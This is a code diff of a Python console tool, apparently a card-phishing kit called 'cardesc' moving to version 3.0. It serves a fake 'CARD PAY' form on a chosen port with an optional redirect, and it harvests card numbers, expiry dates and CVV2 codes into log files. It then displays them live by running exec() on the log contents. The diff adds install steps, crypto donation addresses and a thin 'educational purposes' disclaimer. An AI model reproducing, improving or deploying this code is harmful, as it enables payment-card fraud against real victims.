@@ -6,7 +6,7 @@ from prettytable import PrettyTable
 import os
 
 os.system('clear || cls')
-о = open('log.log', 'w')
+о = open('dist/log.log', 'w')
 о.close()
 
 class A:
@@ -21,48 +21,87 @@ class B:
         while True:
             import os
             x = PrettyTable()
-            x.field_names = ['Ceть', 'Number', 'DATEX','DATEY', 'CVV2']
+            x.field_names = ['OS', 'Number', 'Date', 'CVV2']
             g=0
-            exec(open('log.log').read())
+            exec(open('dist/log.log').read())
             print(x)
             time.sleep(1)
             os.system("clear")
 
-print(""" __        __   __   ___  __   __  
+print("""\n __        __   __   ___  __   __  
 /  `  /\  |__) |  \ |__  /__` /  ` 
 \__, /~~\ |  \ |__/ |___ .__/ \__, 
-                v.2.0
+
+                v.3.0
            :: t.me/oldnum ::
-        : donate: P1061248421 :          """)
+  btc: 3LXDKcrjVXxpGhWXEnVMnndJP45nos2LBS          
+   eth: 0x7b6788a41F5379f49633a368FA902d47D318E4eC
+    payeer: P1061248421\n""")
 print("""
 [0] История BANK
 [1] CARD PAY
-[2] Выход
+[2] Helping
 """)
 used = input("Введите номер: ")
 if used == "0":
     try:
-        x = PrettyTable()
-        x.field_names = ['PAY', 'NUMBER', 'DATEX', 'DATEY', 'CVV2']
-        exec(open('data.log').read())
-        print(x)
+        os.system('clear || cls')
+        print("""\n __        __   __   ___  __   __  
+/  `  /\  |__) |  \ |__  /__` /  ` 
+\__, /~~\ |  \ |__/ |___ .__/ \__, 
+
+                v.3.0
+           :: t.me/oldnum ::
+  btc: 3LXDKcrjVXxpGhWXEnVMnndJP45nos2LBS          
+   eth: 0x7b6788a41F5379f49633a368FA902d47D318E4eC
+    payeer: P1061248421\n""")
+        x = open('result.log', 'r')
+        print(x.read())
         exit()
     except:
         exit()
 elif used == '2':
     os.system('clear || cls')
-    print(""" __        __   __   ___  __   __  
+    print("""\n __        __   __   ___  __   __  
 /  `  /\  |__) |  \ |__  /__` /  ` 
-\__, /~~\ |  \ |__/ |___ .__/ \__, 
-                                   
-            :card_form_pay:         
-           ::t.me/escdroid::
-        : donate: P1061248421 :          """)
+\__, /~~\ |  \ |__/ |___ .__/ \__,
+
+                v.3.0         
+           ::t.me/oldnum::
+  btc: 3LXDKcrjVXxpGhWXEnVMnndJP45nos2LBS          
+   eth: 0x7b6788a41F5379f49633a368FA902d47D318E4eC
+    payeer: P1061248421\n""")
+    print("""#  cardesc  v.3.0
+    apt update && apt upgrade
+    git clone https://github.com/oldnum/cardesc
+    cd cardesc
+    pip3 install -r requirements.txt
+
+#  launch
+    python3 bank.py
+
+#  Ukraine
+Все, що тут написано, написано виключно для освітніх і дослідницьких цілей, а також для розуміння механізмів захисту від злому. Сподіваємося, що ця програма допоможе вам краще організувати свою безпеку в Інтернеті, попереджений є озброєним. Автор @oldnum жодним чином не рекомендує використовувати цю інформацію для злому :/
+Майте на увазі, ФБР стежить за вами :|
+
+# Russian
+Все написанное здесь написано исключительно в образовательных и исследовательских целях, а также для понимания механизмов защиты от взлома. Надеемся, что эта программа поможет вам лучше организовать свою безопасность в интернете, предупрежден — значит, вооружен. Автор @oldnum ни в коем случае не рекомендует использовать эту информацию для взлома :/
+Имейте в виду, ФБР следит за вами :|
+
+#  English
+Everything written here is written solely for educational and research purposes, as well as to understand the mechanisms of protection against hacking. We hope that this program will help you to better organize your security on the Internet, forewarned is forearmed. The author of @oldnum does not in any way recommend using this information for hacking :/
+Keep in mind, the FBI is watching you :|
+
+#  Donate:
+btc: 3LXDKcrjVXxpGhWXEnVMnndJP45nos2LBS
+eth: 0x7b6788a41F5379f49633a368FA902d47D318E4eC
+payeer: P1061248421
+""")
     print("""Bye!""")
     exit()
 
 ports = input("Порт: ")
-reloc = input("Редирект: ")
+reloc = input("Редирект or (enter): ")
 if reloc != "":
     if used == "1":
         f = open("dist/location.location", 'w')
